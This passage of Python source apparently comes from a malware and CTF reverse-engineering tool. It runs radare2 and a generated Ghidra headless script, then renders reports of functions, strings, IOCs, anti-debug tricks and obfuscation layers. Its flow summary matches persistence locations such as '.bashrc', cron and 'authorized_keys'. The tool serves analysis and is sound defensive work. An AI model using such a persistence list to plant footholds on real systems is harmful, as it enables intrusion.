        self.r2, self.path, self.timeout = r2, path, timeout
        self.partial = False

    def batch(self, cmds: list[tuple[str, str]]) -> dict[str, str]:
        script = ";".join(f"?e @@RA@@{k};{c}" for k, c in cmds)
        argv = [self.r2, "-2", "-q", "-N", "-e", "scr.color=0", "-e", "scr.interactive=false", "-e", "bin.cache=true",
                "-e", "search.maxhits=500", "-c", script, self.path]
        p = subprocess.Popen(argv, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.DEVNULL)
        try:
            out, _err = p.communicate(timeout=self.timeout)
        except subprocess.TimeoutExpired:
            p.kill()
            out, _err = p.communicate()
            self.partial = True
        res: dict[str, str] = {}
        key = None
        for line in out.decode("utf-8", "replace").splitlines():
            if line.startswith("@@RA@@"):
                key = line[6:].strip()
                res[key] = ""
            elif key is not None:
                res[key] += line + "\n"
        return res

    def cmdj(self, cmd: str) -> Any:
        txt = self.batch([("x", cmd)]).get("x", "").strip()
        return json.loads(txt) if txt else None

    def cmd(self, cmd: str) -> str:
        return self.batch([("x", cmd)]).get("x", "")

    def close(self) -> None:
        return None


class _R2Pipe:
    """radare2 through r2pipe (no native timeout; the caller wraps the batch in a thread)."""

    def __init__(self, r2pipe_mod: Any, path: str) -> None:
        self.r = r2pipe_mod.open(path, flags=["-2", "-N", "-e", "scr.color=0", "-e", "bin.cache=true"])

    def cmdj(self, cmd: str) -> Any:
        return self.r.cmdj(cmd)

    def cmd(self, cmd: str) -> str:
        return self.r.cmd(cmd)

    def close(self) -> None:
        try:
            self.r.quit()
            proc = getattr(self.r, "process", None)
            if proc is not None:
                proc.kill()
        except Exception:  # noqa: BLE001
            pass


def _r2_run(sess: Any, cmds: list[tuple[str, str, bool]], notes: list[str]) -> dict[str, Any]:
    """Run (key, command, is_json) tuples; a bad chunk drops only its key (note, not error)."""
    out: dict[str, Any] = {}
    if hasattr(sess, "batch"):
        raw = sess.batch([(k, c) for k, c, _j in cmds])
        for k, _c, isj in cmds:
            txt = raw.get(k)
            if txt is None:
                continue
            if not isj:
                out[k] = txt
                continue
            txt = txt.strip()
            if not txt:
                out[k] = None
                continue
            try:
                out[k] = json.loads(txt)
            except ValueError:
                out[k] = None
                notes.append(f"r2: invalid JSON for {k}")
        return out
    for k, c, isj in cmds:
        try:
            out[k] = sess.cmdj(c) if isj else sess.cmd(c)
        except (ValueError, TypeError, KeyError) as exc:
            out[k] = None
            notes.append(f"r2: invalid JSON for {k} ({type(exc).__name__})")
    return out


def _rank_string(s: dict) -> tuple:
    return (min((_TAG_RANK.get(t, 9) for t in s.get("tags", [])), default=9), 0 if s.get("xrefs") else 1)


def _str_tags(v: str) -> list[str]:
    tags = []
    if FLAG_RE.search(v):
        tags.append("FLAG")
    for tg, rx in _STR_TAG_RES:
        if rx.search(v):
            tags.append(tg)
    return list(dict.fromkeys(tags))


def _merge_functions(b: dict, funcs: list[dict]) -> None:
    by = {f["addr"]: f for f in b["functions"]}
    for f in funcs:
        old = by.get(f["addr"])
        if old:
            old.update({k: v for k, v in f.items() if v not in (None, "")})
        else:
            b["functions"].append(f)
            by[f["addr"]] = f


def _merge_strings(b: dict, strs: list[dict]) -> dict[int, dict]:
    by = {s["vaddr"]: s for s in b["strings"] if s.get("vaddr") is not None}
    for s in strs:
        old = by.get(s["vaddr"])
        if old:
            for x in s.get("xrefs", []):
                if x not in old["xrefs"]:
                    old["xrefs"].append(x)
        else:
            s.setdefault("offset", s.get("paddr") or 0)
            s.setdefault("section", "")
            s.setdefault("xrefs", [])
            s["tags"] = _str_tags(s["value"])
            b["strings"].append(s)
            by[s["vaddr"]] = s
    return by


def _r2_collect(sess: Any, opts: Options, b: dict, notes: list[str], big: bool) -> None:
    r = _r2_run(sess, [("info", "ij", True), ("sections", "iSj", True), ("imports", "iij", True), ("exports", "iEj", True),
                       ("symbols", "isj", True), ("strings", "izj", True), ("analysis", "aa" if big and not opts.deep else "aaa", False),
                       ("functions", "aflj", True), ("syscalls", "/asj", True), ("main", "afij @ main", True)], notes)
    funcs: list[dict] = []
    for d in r.get("functions") or []:
        try:
            a = _jaddr(d)
            if a is None:
                continue
            funcs.append({"name": _jname(d) or f"sub_{a:x}", "addr": int(a), "size": int(d.get("size", d.get("realsz", 0)) or 0),
                          "source": "r2", "confidence": "high", "nbbs": d.get("nbbs"), "calls": []})
        except (TypeError, ValueError):
            continue
    _merge_functions(b, funcs)
    for m in (r.get("main") or [])[:1]:
        a = _jaddr(m)
        if a is not None:
            b["main"] = int(a)
    strs: list[dict] = []
    for d in r.get("strings") or []:
        v = d.get("string")
        if not isinstance(v, str):
            continue
        bb = decode.b64_decode(v) if re.fullmatch(r"[A-Za-z0-9+/]{8,}={0,2}", v) else None
        if bb and decode.printable_ratio(bb) >= 0.9:
            ln = d.get("length")
            # older r2 versions base64-encode izj strings (their 'length' is the decoded length)
            if (isinstance(ln, int) and ln == len(bb) != len(v)) or (ln is None and len(v) >= 16):
                v = bb.decode("latin-1")
        elif decode.printable_ratio(v.encode("utf-8", "replace")) < 0.9:
            bb = decode.b64_decode(v)
            if bb and decode.printable_ratio(bb) >= 0.9:
                v = bb.decode("latin-1")
        a = d.get("vaddr", d.get("paddr"))
        if a is None:
            continue
        strs.append({"value": v, "vaddr": int(a), "paddr": int(d.get("paddr", 0) or 0), "section": d.get("section", "") or ""})
    by = _merge_strings(b, strs)
    have = {i["name"]: i for i in b["imports"]}
    for d in r.get("imports") or []:
        nm = _jname(d).replace("sym.imp.", "")
        if nm and nm not in have:
            ent = {"name": nm, "category": (_api_lookup(nm) or (None,))[0], "lib": d.get("libname", "") or "", "plt": d.get("plt")}
            b["imports"].append(ent)
            have[nm] = ent
        elif nm:
            have[nm]["lib"] = have[nm].get("lib") or d.get("libname", "") or ""
            have[nm]["plt"] = have[nm].get("plt") or d.get("plt")
    for d in r.get("exports") or []:
        a = _jaddr(d)
        if a is not None and _jname(d) and not any(e["name"] == _jname(d) for e in b["exports"]):
            b["exports"].append({"name": _jname(d), "addr": int(a)})
    for d in r.get("syscalls") or []:
        a = _jaddr(d)
        if a is not None:
            b["syscalls"].append({"site": int(a), "number": d.get("sysnum"), "name": d.get("name", "?"), "function": None})
    # phase 2: xrefs
    top = sorted((s for s in b["strings"] if s.get("vaddr") is not None), key=_rank_string)[:40]
    imps = [i["name"] for i in b["imports"] if i.get("category") and i["category"] != "OUTPUT"][:40]
    cmds = [(f"s{i}", f"axtj @ {s['vaddr']}", True) for i, s in enumerate(top)] + [(f"i{i}", f"axtj @ sym.imp.{n}", True) for i, n in enumerate(imps)]
    if opts.deep:
        cmds.append(("pdf", "pdf @ main", False))
    x = _r2_run(sess, cmds, notes) if cmds else {}
    for i, s in enumerate(top):
        for d in x.get(f"s{i}") or []:
            a = d.get("from", d.get("addr"))
            if a is not None:
                ent = {"site": int(a), "function": d.get("fcn_name") or d.get("name")}
                if ent not in s["xrefs"]:
                    s["xrefs"].append(ent)
    if x.get("pdf"):
        b["disasm"]["functions"]["main (r2 pdf)"] = "\n".join(str(x["pdf"]).splitlines()[:300])


def _with_timeout(fn: Callable[[], Any], timeout: int, on_timeout: Callable[[], None]) -> Any:
    box: dict[str, Any] = {}

    def work() -> None:
        try:
            box["v"] = fn()
        except Exception as exc:  # noqa: BLE001
            box["e"] = exc
    t = threading.Thread(target=work, daemon=True)
    t.start()
    t.join(timeout)
    if t.is_alive():
        on_timeout()
        raise TimeoutError(f"timeout after {timeout}s")
    if "e" in box:
        raise box["e"]
    return box.get("v")


def _run_r2(data: bytes, path: str | None, opts: Options, report: Report, engines: Engines, b: dict) -> None:
    st = report.engines["r2"]
    t0 = time.time()
    st.path = engines.r2_path or ""
    tmp = None
    try:
        if path is None or not os.path.isfile(path):
            fd, tmp = tempfile.mkstemp(prefix="revauto_")
            with os.fdopen(fd, "wb") as fh:
                fh.write(data)
            path = tmp
        timeout = opts.timeout or R2_TIMEOUT
        if engines.r2_backend_factory:
            sess = engines.r2_backend_factory(path, opts)
            st.backend = "factory"
        elif engines.r2pipe is not None:
            sess, st.backend = _R2Pipe(engines.r2pipe, path), "r2pipe"
        else:
            sess, st.backend = _R2Sub(engines.r2_path or "r2", path, timeout), "subprocess"
        if not engines.r2_backend_factory and engines.r2_path:
            try:
                v = subprocess.run([engines.r2_path, "-v"], capture_output=True, timeout=5, stdin=subprocess.DEVNULL)
                st.reason = v.stdout.decode("utf-8", "replace").splitlines()[0][:80] if v.stdout else ""
            except (OSError, subprocess.SubprocessError):
                pass
        notes: list[str] = []
        try:
            _with_timeout(lambda: _r2_collect(sess, opts, b, notes, len(data) > (8 << 20)), timeout, sess.close)
            st.status = "ok"
            if getattr(sess, "partial", False):
                st.status, st.reason = "error", f"timeout after {timeout}s (partial results kept)"
        except TimeoutError as exc:
            st.status, st.reason = "error", str(exc)
        finally:
            with contextlib.suppress(Exception):
                sess.close()
        report.notes.extend(notes)
    except Exception as exc:  # noqa: BLE001
        st.status, st.reason = "error", f"{type(exc).__name__}: {str(exc)[:100]}"
    finally:
        if tmp:
            with contextlib.suppress(OSError):
                os.unlink(tmp)
        st.seconds = round(time.time() - t0, 2)


# ---------- engines: ghidra
_GHIDRA_SCRIPT = r'''// RevautoDigest.java -- generated by toolkit/modules/revauto.py. Read-only analysis digest.
import ghidra.app.script.GhidraScript;
import ghidra.app.decompiler.DecompInterface;
import ghidra.app.decompiler.DecompileResults;
import ghidra.program.model.address.Address;
import ghidra.program.model.listing.Data;
import ghidra.program.model.listing.Function;
import ghidra.program.model.listing.FunctionIterator;
import ghidra.program.model.symbol.Reference;
import ghidra.program.model.symbol.Symbol;
import ghidra.program.model.symbol.SymbolIterator;
import ghidra.program.util.DefinedDataIterator;
import java.io.FileOutputStream;
import java.io.OutputStreamWriter;
import java.io.Writer;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Set;

public class RevautoDigest extends GhidraScript {
    private static String q(String s) {
        if (s == null) return "null";
        StringBuilder b = new StringBuilder("\"");
        for (char c : s.toCharArray()) {
            switch (c) {
                case '"': b.append("\\\""); break;
                case '\\': b.append("\\\\"); break;
                case '\n': b.append("\\n"); break;
                case '\r': b.append("\\r"); break;
                case '\t': b.append("\\t"); break;
                default:
                    if (c < 0x20) b.append(String.format("\\u%04x", (int) c));
                    else b.append(c);
            }
        }
        return b.append('"').toString();
    }

    @Override
    public void run() throws Exception {
        String[] args = getScriptArgs();
        String outPath = args.length > 0 ? args[0] : "revauto_ghidra.json";
        int maxDecomp = args.length > 1 ? Integer.parseInt(args[1]) : 3;
        StringBuilder sb = new StringBuilder();
        sb.append("{\"program\":").append(q(currentProgram.getName()));
        sb.append(",\"functions\":[");
        Map<String, Integer> strRefs = new HashMap<>();
        FunctionIterator fit = currentProgram.getFunctionManager().getFunctions(true);
        boolean first = true;
        int nf = 0;
        while (fit.hasNext() && !monitor.isCancelled() && nf < 20000) {
            Function f = fit.next();
            nf++;
            if (!first) sb.append(',');
            first = false;
            sb.append("{\"name\":").append(q(f.getName()));
            sb.append(",\"addr\":").append(f.getEntryPoint().getOffset());
            sb.append(",\"size\":").append(f.getBody().getNumAddresses());
            sb.append(",\"thunk\":").append(f.isThunk());
            sb.append(",\"external\":").append(f.isExternal());
            sb.append(",\"calls\":[");
            Set<Function> called = f.getCalledFunctions(monitor);
            boolean fc = true;
            for (Function c : called) {
                if (!fc) sb.append(',');
                fc = false;
                sb.append(q(c.getName()));
            }
            sb.append("]}");
        }
        sb.append("],\"imports\":[");
        SymbolIterator ext = currentProgram.getSymbolTable().getExternalSymbols();
        first = true;
        while (ext.hasNext()) {
            Symbol s = ext.next();
            if (!first) sb.append(',');
            first = false;
            sb.append("{\"name\":").append(q(s.getName()));
            sb.append(",\"lib\":").append(q(s.getParentNamespace().getName())).append('}');
        }
        sb.append("],\"strings\":[");
        first = true;
        int ns = 0;
        for (Data d : DefinedDataIterator.definedStrings(currentProgram)) {
            if (monitor.isCancelled() || ns >= 5000) break;
            ns++;
            Address a = d.getAddress();
            if (!first) sb.append(',');
            first = false;
            sb.append("{\"addr\":").append(a.getOffset());
            sb.append(",\"value\":").append(q(d.getDefaultValueRepresentation()));
            sb.append(",\"xrefs\":[");
            boolean fx = true;
            int nx = 0;
            for (Reference r : getReferencesTo(a)) {
                if (nx++ >= 32) break;
                Function rf = getFunctionContaining(r.getFromAddress());
                if (!fx) sb.append(',');
                fx = false;
                sb.append("{\"from\":").append(r.getFromAddress().getOffset());
                sb.append(",\"func\":").append(q(rf == null ? null : rf.getName())).append('}');
                if (rf != null) strRefs.merge(rf.getName(), 1, Integer::sum);
            }
            sb.append("]}");
        }
        sb.append("],\"decompiled\":{");
        List<Function> targets = new ArrayList<>();
        for (Function f : currentProgram.getFunctionManager().getFunctions(true)) {
            if (f.getName().equals("main")) targets.add(0, f);
        }
        List<Map.Entry<String, Integer>> ranked = new ArrayList<>(strRefs.entrySet());
        ranked.sort((x, y) -> y.getValue() - x.getValue());
        for (Map.Entry<String, Integer> e : ranked) {
            if (targets.size() >= maxDecomp) break;
            for (Function f : getGlobalFunctions(e.getKey())) {
                if (!f.isThunk() && !f.isExternal() && !targets.contains(f)) { targets.add(f); break; }
            }
        }
        DecompInterface ifc = new DecompInterface();
        ifc.openProgram(currentProgram);
        first = true;
        for (Function f : targets) {
            if (monitor.isCancelled()) break;
            DecompileResults r = ifc.decompileFunction(f, 30, monitor);
            if (r == null || !r.decompileCompleted() || r.getDecompiledFunction() == null) continue;
            if (!first) sb.append(',');
            first = false;
            sb.append(q(f.getName())).append(':').append(q(r.getDecompiledFunction().getC()));
        }
        ifc.dispose();
        sb.append("}}");
        try (Writer w = new OutputStreamWriter(new FileOutputStream(outPath), StandardCharsets.UTF_8)) {
            w.write(sb.toString());
        }
    }
}
'''


def _ghidra_parse(obj: Any, b: dict, opts: Options) -> None:
    """Merge Appendix-A JSON (already parsed or a JSON string) into ``b``."""
    if isinstance(obj, (str, bytes)):
        obj = json.loads(obj)
    funcs = []
    for f in obj.get("functions", []):
        if f.get("external"):
            continue
        funcs.append({"name": f["name"], "addr": int(f["addr"]), "size": int(f.get("size", 0)), "source": "ghidra",
                      "confidence": "high", "calls": [], "ghidra_calls": f.get("calls", [])})
    _merge_functions(b, funcs)
    have = {i["name"] for i in b["imports"]}
    for i in obj.get("imports", []):
        if i["name"] not in have:
            b["imports"].append({"name": i["name"], "category": (_api_lookup(i["name"]) or (None,))[0], "lib": i.get("lib", ""), "plt": None})
        else:
            next(x for x in b["imports"] if x["name"] == i["name"])["lib"] = i.get("lib", "")
    strs = []
    for s in obj.get("strings", []):
        v = s.get("value", "")
        if len(v) >= 2 and v[0] == v[-1] == '"':
            v = v[1:-1]
        strs.append({"value": v, "vaddr": int(s["addr"]),
                     "xrefs": [{"site": int(x["from"]), "function": x.get("func")} for x in s.get("xrefs", [])]})
    _merge_strings(b, strs)
    b["decompiled"].update(obj.get("decompiled", {}))


def _run_ghidra(data: bytes, path: str | None, opts: Options, report: Report, engines: Engines, b: dict) -> None:
    st = report.engines["ghidra"]
    t0 = time.time()
    st.path = engines.ghidra_path or ""
    tmp = None
    try:
        if engines.ghidra_runner:
            _ghidra_parse(engines.ghidra_runner(path, opts), b, opts)
            st.status, st.backend = "ok", "runner"
        else:
            if path is None or not os.path.isfile(path):
                fd, tmp = tempfile.mkstemp(prefix="revauto_")
                with os.fdopen(fd, "wb") as fh:
                    fh.write(data)
                path = tmp
            timeout = opts.timeout or GHIDRA_TIMEOUT
            with tempfile.TemporaryDirectory() as td:
                with open(os.path.join(td, "RevautoDigest.java"), "w", encoding="utf-8") as fh:
                    fh.write(_GHIDRA_SCRIPT)
                os.makedirs(os.path.join(td, "proj"))
                out = os.path.join(td, "out.json")
                argv = [engines.ghidra_path, os.path.join(td, "proj"), "revauto", "-import", path, "-scriptPath", td,
                        "-postScript", "RevautoDigest.java", out, str(10 if opts.deep else 3), "-deleteProject",
                        "-analysisTimeoutPerFile", str(timeout)]
                try:
                    p = subprocess.run(argv, capture_output=True, timeout=timeout + 120, stdin=subprocess.DEVNULL)
                except subprocess.TimeoutExpired:
                    raise TimeoutError(f"timeout after {timeout + 120}s")
                st.backend = "analyzeHeadless"
                if not os.path.isfile(out):
                    tail = " | ".join(p.stderr.decode("utf-8", "replace").splitlines()[-20:])[-300:]
                    raise RuntimeError(f"no output produced: {tail}")
                with open(out, encoding="utf-8") as fh:
                    _ghidra_parse(fh.read(), b, opts)
                st.status = "ok"
    except Exception as exc:  # noqa: BLE001
        st.status, st.reason = "error", f"{type(exc).__name__}: {str(exc)[:200]}"
    finally:
        if tmp:
            with contextlib.suppress(OSError):
                os.unlink(tmp)
        st.seconds = round(time.time() - t0, 2)


def _run_engines(data: bytes, path: str | None, opts: Options, report: Report, engines: Engines, b: dict, ctx: _BinCtx) -> None:
    r2s = EngineStatus("r2", "not-requested")
    gh = EngineStatus("ghidra", "not-requested")
    report.engines["r2"], report.engines["ghidra"] = r2s, gh
    report.metrics["capstone"] = bool(engines.capstone)
    want = opts.engine
    if want in ("auto", "r2"):
        if engines.r2_path or engines.r2_backend_factory:
            _run_r2(data, path, opts, report, engines, b)
        else:
            r2s.status, r2s.reason = "skipped", "radare2 not found on PATH"
    if want == "ghidra":
        if engines.ghidra_path or engines.ghidra_runner:
            _run_ghidra(data, path, opts, report, engines, b)
        else:
            gh.status, gh.reason = "skipped", "analyzeHeadless not found (PATH, $GHIDRA_INSTALL_DIR, /usr/share/ghidra)"
    explicit = {"r2": r2s, "ghidra": gh}.get(want)
    if explicit is not None and explicit.status != "ok":
        report.metrics["engine_failed"] = f"{want}: {explicit.reason or explicit.status}"
    if want == "none":
        r2s.reason = gh.reason = ""


# ---------- rendering
def _clip(s: str, n: int = 100) -> str:
    return s if len(s) <= n else s[:n - 1] + "…"


def _lbl(conf: str) -> str:
    return CONF_LABEL.get(conf, "L")


def _leaf_layers(report: Report) -> list[Layer]:
    kids = {l.parent for l in report.layers if l.parent}
    return [l for l in report.layers if l.id not in kids]


def _behaviours(report: Report) -> list[str]:
    cats: set[str] = set()
    leaves = {l.id for l in _leaf_layers(report)}
    for b in report.blocks:
        if b.layer in leaves or b.layer == "bin":
            cats.update(b.categories)
    for t in report.tells:
        pass
    return [c for c in CATEGORIES if c in cats]


def _headline(report: Report) -> str:
    n = report.target.get("name", "?")
    if report.lane == "binary" and report.binary:
        b = report.binary
        prot = []
        if "PIE" in (b.get("protections") or {}) and str(b["protections"]["PIE"]).startswith("enabled"):
            prot.append("PIE")
        if b.get("static"):
            prot.append("static")
        if b.get("stripped"):
            prot.append("stripped")
        eng = "r2" if report.engines.get("r2") and report.engines["r2"].status == "ok" else (
            "ghidra" if report.engines.get("ghidra") and report.engines["ghidra"].status == "ok" else "builtin")
        desc = " ".join(x for x in (b.get("format"), b.get("arch"), b.get("type")) if x)
        return (f"{n}: {desc}{', ' + ', '.join(prot) if prot else ''}, {len(b.get('functions', []))} functions, "
                f"{len(b.get('imports', []))} imports, engine {eng}")
    if report.lane == "blob":
        return f"{n}: data blob, no decodable layer found"
    leaves = _leaf_layers(report)
    desc = _LANG_DESC.get(report.lang, report.lang)
    nl = max(0, len(report.layers) - 1)
    parts = len([b for b in report.blocks if b.layer in {l.id for l in leaves}])
    return f"{n}: {desc}, {nl} obfuscation layer(s) unwrapped, {parts} parts, risk {report.scores.get('risk', {}).get('band', '?')}"


def _flow(report: Report) -> str:
    leaves = _leaf_layers(report)
    cats: list[str] = []
    for l in leaves:
        for c in l.meta.get("flow_cats", []):
            if c not in cats:
                cats.append(c)
    if not cats:
        return ""
    ipp = next((i.value for i in report.iocs if i.type == "ip_port"), None)
    pth = next((i.value for i in report.iocs if i.type == "path" and any(k in i.value for k in (".bashrc", ".profile", "cron", "rc.local", ".service", "authorized_keys"))), None)
    out = []
    for c in cats:
        if c == "NETWORK" and ipp:
            out.append(f"NETWORK({ipp})")
        elif c == "PERSISTENCE" and pth:
            out.append(f"PERSISTENCE({pth})")
        else:
            out.append(c)
    return " -> ".join(out)


def _sev_key(t: Tell) -> tuple:
    return (-SEV_RANK.get(t.severity, 0), t.loc)


_IOC_PRI = {"flag": 0, "url": 1, "ip_port": 2, "ip": 3, "domain": 4, "path": 5}


def render_text(report: Report, deep: bool = False) -> str:
    """Render the compact (default) or ``--deep`` text report."""
    L: list[str] = []
    cap = (lambda n, total: n if deep else min(n, total))

    def sec(name: str, extra: str = "") -> None:
        L.append(f"== {name} =={(' ' + extra) if extra else ''}")

    def more(total: int, shown: int) -> None:
        if total > shown:
            L.append(f"  … {total - shown} more (--deep)")

    sc = report.scores or {}
    sec("SUMMARY")
    L.append("  " + _headline(report))
    fl = _flow(report)
    if report.lane == "script" and fl:
        L.append("  flow: " + fl)
    beh = _behaviours(report)
    if beh:
        L.append("  behaviours: " + ", ".join(beh))
    if sc:
        L.append(f"  risk: {sc['risk']['score']}/100 ({sc['risk']['band']}, tell density)   "
                 f"obfuscation: {sc['obfuscation']['score']}/100 ({sc['obfuscation']['band']}, {sc['obfuscation']['layers']} layers)")
    if report.flags:
        L.append("  flags: " + ", ".join(report.flags))
    b = report.binary
    if report.lane == "binary":
        r2, gh = report.engines.get("r2"), report.engines.get("ghidra")
        cap_s = "capstone present" if report.metrics.get("capstone") else "capstone absent - hex view"
        L.append(f"  engine: builtin (r2 {'ok' if r2 and r2.status == 'ok' else 'absent' if r2 and r2.status == 'skipped' else (r2.status if r2 else '?')}, "
                 f"ghidra {gh.status if gh else '?'}, {cap_s})")
    if report.lane in ("script", "blob") and report.layers:
        sec("LAYERS")
        for l in report.layers[:MAX_LAYERS]:
            kids = any(x.parent == l.id for x in report.layers)
            via = "input" if l.id == "L0" else f"via {l.via}   {l.kind}"
            at = f" @{l.src_loc}" if l.src_loc else ""
            L.append(f"  [{_lbl(l.confidence)}] {l.id:<3} {l.lang:<4} {via}{at}   {len(l.data)} B" + ("" if kids or l.id == "L0" and len(report.layers) == 1 and False else ("   (final)" if not kids and len(report.layers) > 1 else "")))
    if report.lane == "script":
        leaf_ids = {l.id for l in _leaf_layers(report)}
        parts = [x for x in report.blocks if x.layer in leaf_ids or deep]
        sec("PARTS", f"(final layer {', '.join(sorted(leaf_ids))})" if len(leaf_ids) else "")
        if not parts:
            L.append("  (none)")
        lim = len(parts) if deep else 20
        for x in parts[:lim]:
            L.append(f"  [{_lbl(x.confidence)}] " + (x.summary if deep else x.summary))
        more(len(parts), lim)
        if deep:
            for l in report.layers:
                if l.text:
                    sec("LAYER " + l.id, f"({l.lang}, {l.kind})")
                    L.extend("  | " + ln for ln in (l.text.split("\n")[:40]))
                    clean = l.meta.get("clean")
                    if clean:
                        sec("CLEANED " + l.id)
                        L.extend("  | " + ln for ln in clean.split("\n")[:200])
        if report.checkers:
            sec("CHECKERS")
            for c in report.checkers:
                L.append(f"  [{_lbl(c.confidence)}] {c.loc} {c.method}" + (f" -> {c.candidate}" if c.candidate else f"   {c.detail}"))
    if report.lane == "blob" and b:
        sec("BLOB")
        L.append(f"  entropy {b['entropy']} ({b['note']})")
        for s in b.get("strings", [])[:10]:
            L.append("  [L] string " + repr(s["value"]))
        for h in b.get("crypto", [])[:10]:
            L.append(f"  [{_lbl(h['confidence'])}] {h['name']} off {h['offset']:#x}")
        for e in b.get("embedded", [])[:10]:
            L.append(f"  [M] embedded {e['name']} at off {e['offset']:#x}")
    if report.lane == "binary" and b:
        sec("HEADERS")
        L.append(f"  {b['format']} {b['endian']} {b['arch']} {b['type']} entry {b['entry']:#x} interp {b['interp'] or '(none)'}")
        for s in b["sections"][: (None if deep else 12)]:
            L.append(f"  {s['name']:<14} off {s['offset']:#08x} size {s['size']:>8} entropy {s['entropy']:.2f} {s['note']}")
        pk = b["packer"]
        if pk["upx"] or pk["packed"] or pk["pyinstaller"] or pk["notes"]:
            L.append("  packer: " + ", ".join([k for k in ("upx", "packed", "pyinstaller") if pk[k]] + pk["notes"]))
        sec("PROTECTIONS")
        L.append("  " + "  ".join(f"{k} {v}" for k, v in b["protections"].items()))
        sec("ENGINE")
        parts_e = []
        for k in ("r2", "ghidra", "builtin"):
            e = report.engines.get(k)
            if e:
                parts_e.append(f"{k}: {e.status.upper()}" + (f" ({e.reason})" if e.reason else (f" ({e.seconds}s)" if k == "builtin" else "")))
        L.append("  " + "   ".join(parts_e))
        sec("IMPORTS")
        if not b["imports"]:
            L.append("  (none — static or stripped)")
        bycat: dict[str, list[str]] = {}
        for i in b["imports"]:
            bycat.setdefault(i.get("category") or "other", []).append(i["name"])
        for c in [x for x in CATEGORIES if x in bycat] + (["other"] if "other" in bycat else []):
            names = bycat[c]
            L.append(f"  [H] {c}: " + ", ".join(names[: (None if deep else 8)]) + ("" if deep or len(names) <= 8 else f" … +{len(names) - 8}"))
        sec("FUNCTIONS")
        fs = b["functions"]
        shown = [f for f in fs if f["interest"] > 0 or f["source"] != "heuristic" or f["name"] in ("main", "entry")]
        lim = len(shown) if deep else 12
        if not shown:
            L.append("  (none found)")
        for f in shown[:lim]:
            L.append(f"  [{_lbl(f['confidence'])}] {f['name']} @{f['addr']:#x} ({f['source']}): " + ("; ".join(f["actions"][:6 if not deep else None]) or "no notable operations"))
        more(len(shown), lim)
        if len(fs) > len(shown) and not deep:
            L.append(f"  … {len(fs) - len(shown)} more uninteresting (--deep)")
        sec("STRINGS")
        ss = sorted(b["strings"], key=_rank_string)
        ss = [s for s in ss if deep or s["tags"] or s["xrefs"]] or ss
        lim = len(ss) if deep else 20
        for s in ss[:lim]:
            tag = next((t for t in sorted(s["tags"], key=lambda t: _TAG_RANK.get(t, 9))), "STR")
            xr = f"   xref {s['xrefs'][0]['site']:#x}" + (f" ({s['xrefs'][0]['function']})" if s["xrefs"][0]["function"] else "") if s["xrefs"] else ""
            va = f"{s['vaddr']:#x}" if s["vaddr"] is not None else f"off:{s['offset']:#x}"
            conf = "H" if tag in ("FLAG", "PROMPT", "ANTI") else "M"
            L.append(f"  [{conf}] {tag:<8} {va}  \"{_snip(s['value'], 50)}\"{xr}" + (f"  => {s['decoded']!r}" if s.get("decoded") else ""))
        more(len(ss), lim)
        sec("CRYPTO")
        if not b["crypto"]:
            L.append("  (none)")
        for h in b["crypto"][: (None if deep else 10)]:
            va = f"  vaddr {h['vaddr']:#x}" if h.get("vaddr") is not None else ""
            L.append(f"  [{_lbl(h['confidence'])}] {h['name']:<16} off {h['offset']:#x}{va}" + (f" ({h['section']})" if h.get("section") else "") + (f" {h['tag']}" if h.get("tag") else ""))
        sec("ANTI-DEBUG")
        if not b["antidebug"]:
            L.append("  (none)")
        for a in b["antidebug"][: (None if deep else 10)]:
            at = f" @{a['site']:#x}" if a.get("site") is not None else ""
            fn = f" ({a['function']})" if a.get("function") else ""
            L.append(f"  [{_lbl(a['confidence'])}] {a['detail']}{at}{fn}")
        if b["xor_keys"]:
            L.append("  [L] possible single-byte XOR keys: " + ", ".join(f"{k:#04x} x{c}" for k, c in b["xor_keys"]))
        sec("SYSCALLS")
        if not b["syscalls"]:
            L.append("  (none)")
        else:
            cnt = collections.Counter(s["name"] for s in b["syscalls"])
            L.append("  " + ", ".join(f"{n} x{c}" for n, c in cnt.most_common()))
        if b["embedded"]:
            sec("EMBEDDED")
            for e in b["embedded"]:
                L.append(f"  [L] {e['name']} at off {e['offset']:#x}")
        if b["high_entropy"]:
            for h in b["high_entropy"][:5]:
                L.append(f"  [L] possible encrypted blob at off {h['offset']:#x} ({h['size']} bytes)")
        sec("DISASM", "(main/entry)")
        L.extend("  " + x for x in b["disasm"]["main"].split("\n")[: (None if deep else 20)])
        for nm, txt in (b["disasm"]["functions"].items() if deep else []):
            L.append(f"  -- {nm}")
            L.extend("  " + x for x in txt.split("\n"))
        if b["decompiled"]:
            sec("DECOMPILED")
            for nm, code in b["decompiled"].items() if deep else list(b["decompiled"].items())[:1]:
                L.append(f"  // {nm}")
                L.extend("  " + x for x in code.split("\n")[: (200 if deep else 60)])
    tells = sorted(report.tells, key=_sev_key)
    if tells:
        sec("TELLS")
        lim = len(tells) if deep else 20
        for t in tells[:lim]:
            L.append(f"  [{_lbl(t.confidence)}] {t.severity:<6} {t.loc:<8} {t.id:<18} {t.title}" + (f": {t.detail}" if t.detail and t.detail != t.title else ""))
        more(len(tells), lim)
    iocs = sorted(report.iocs, key=lambda i: (_IOC_PRI.get(i.type, 9), i.loc))
    if iocs:
        sec("IOCS")
        lim = len(iocs) if deep else 25
        for i in iocs[:lim]:
            tg = f" [{','.join(i.tags)}]" if i.tags else ""
            L.append(f"  [{_lbl(i.confidence)}] {i.type:<8} {_snip(i.value, 60):<32} {i.loc}{tg}")
        more(len(iocs), lim)
    if report.lane == "script":
        cr = report.metrics.get("crypto_script", [])
        if cr:
            sec("CRYPTO")
            for h in cr[:10]:
                L.append(f"  [{_lbl(h['confidence'])}] {h['name']}  {h.get('loc', '')}")
    sec("NEXT STEPS")
    if report.next_steps:
        L.extend("  - " + s for s in report.next_steps)
    else:
        L.append("  - (none)")
    if report.notes:
        sec("NOTES")
        for n in report.notes[: (None if deep else 8)]:
            L.append("  - " + n)
    if report.errors:
        sec("ERRORS")
        L.append(f"  {len(report.errors)} stage error(s):")
        for e in report.errors[: (None if deep else 3)]:
            L.append("  - " + e)
    return "\n".join(x if deep else _clip(x) for x in L)


def _jsafe(o: Any) -> Any:
    if isinstance(o, bytes):
        return o.decode("latin-1")
    if isinstance(o, dict):
        return {str(k): _jsafe(v) for k, v in o.items() if not str(k).startswith("_")}
    if isinstance(o, (list, tuple)):
        return [_jsafe(x) for x in o]
    if isinstance(o, EngineStatus):
        return dataclasses.asdict(o)
    return o


def report_to_dict(report: Report) -> dict:
